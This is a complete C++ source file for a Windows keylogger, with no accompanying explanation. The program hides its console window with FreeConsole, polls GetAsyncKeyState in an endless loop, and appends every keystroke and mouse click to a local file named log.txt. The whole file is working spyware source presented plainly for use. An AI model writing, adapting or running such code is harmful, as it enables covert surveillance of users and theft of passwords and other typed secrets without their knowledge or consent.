#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int logKey(int key, const char *filename) {
    Sleep(10);
    FILE *logFile = fopen(filename, "a+");

    if (logFile == nullptr) {
        return -1;
    }

    switch (key) {
        case VK_BACK: fprintf(logFile, "[BACKSPACE]"); break;
        case VK_RETURN: fprintf(logFile, "[ENTER]"); break;
        case VK_SHIFT: fprintf(logFile, "[SHIFT]"); break;
        case VK_CONTROL: fprintf(logFile, "[CTRL]"); break;
        case VK_INSERT: fprintf(logFile, "[INSERT]"); break;
        case VK_HOME: fprintf(logFile, "[HOME]"); break;
        case VK_END: fprintf(logFile, "[END]"); break;
        case VK_PRINT: fprintf(logFile, "[PRINT SCREEN]"); break;
        case VK_PAUSE: fprintf(logFile, "[PAUSE/BREAK]"); break;
        case VK_DELETE: fprintf(logFile, "[DELETE]"); break;
        case VK_LBUTTON: fprintf(logFile, "[LEFT CLICK]"); break;
        case VK_RBUTTON: fprintf(logFile, "[RIGHT CLICK]"); break;
        case VK_LEFT: fprintf(logFile, "[LEFT ARROW]"); break;
        case VK_RIGHT: fprintf(logFile, "[RIGHT ARROW]"); break;
        case VK_UP: fprintf(logFile, "[UP ARROW]"); break;
        case VK_DOWN: fprintf(logFile, "[DOWN ARROW]"); break;
        case VK_TAB: fprintf(logFile, "[TAB]"); break;
        case VK_ESCAPE: fprintf(logFile, "[ESC]"); break;
        case VK_LWIN: fprintf(logFile, "[LEFT WIN]"); break;
        case VK_RWIN: fprintf(logFile, "[RIGHT WIN]"); break;
        case VK_MENU: fprintf(logFile, "[ALT]"); break;
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            fprintf(logFile, "[F%d]", key - VK_F1 + 1); break;
        default:
            if (key >= 32 && key <= 126) {
                fputc(key, logFile);
            } else {
                fprintf(logFile, "[UNKNOWN]");
            }
            break;
    }

    fclose(logFile);
    return 0;
}

int main() {
    FreeConsole();
    while (true) {
        Sleep(10);
        for (int key = 8; key <= 255; ++key) {
            if (GetAsyncKeyState(key) == -32767) {
                logKey(key, "log.txt");
            }
        }
    }
    return 0;
}
